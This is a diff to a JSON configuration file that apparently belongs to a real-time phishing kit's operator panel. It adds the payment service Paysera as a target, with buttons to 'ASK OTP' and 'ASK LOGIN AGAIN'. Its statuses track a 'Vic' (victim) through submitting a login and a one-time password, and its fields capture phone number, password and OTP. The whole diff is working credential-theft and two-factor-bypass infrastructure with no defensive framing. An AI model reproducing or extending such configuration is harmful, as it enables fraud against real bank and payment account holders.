@@ -125,6 +125,10 @@
 			"id": "jl"
 		},
 		{
+			"name": "PS",
+			"id": "paysera"
+		},
+		{
 			"name": "Peoples Choice",
 			"id": "people"
 		},
@@ -3382,6 +3386,67 @@
 		"mainInfo": [
 			{
 				"usernameHeading": "username"
+			}
+		]
+	},
+	"paysera": {
+		"buttons": [
+			{
+				"name": "ASK LOGIN AGAIN",
+				"status": "0"
+			},
+			{
+				"name": "ASK OTP",
+				"status": "2"
+			},
+			{
+				"name": "FINISH",
+				"status": "4"
+			}
+		],
+		"status": [
+			{
+				"status": 0,
+				"meaning": "Vic Resubmitting Login"
+			},
+			{
+				"status": 1,
+				"meaning": "Vic Waiting... Submitted Login"
+			},
+			{
+				"status": 2,
+				"meaning": "Vic Submitting OTP"
+			},
+			{
+				"status": 3,
+				"meaning": "Vic Waiting... Submitted OTP"
+			},
+			{
+				"status": 4,
+				"meaning": "Finished"
+			},
+			{
+				"status": 5,
+				"meaning": "Vic Waiting... Resubmitted Login"
+			}
+		],
+		"information": [
+			{
+				"heading": "Phone Number",
+				"key": "telephone"
+			},
+			{
+				"heading": "Password",
+				"key": "password"
+			},
+			{
+				"heading": "OTP",
+				"key": "otp"
+			}
+		],
+		"mainInfo": [
+			{
+				"usernameHeading": "telephone"
 			}
 		]
 	},
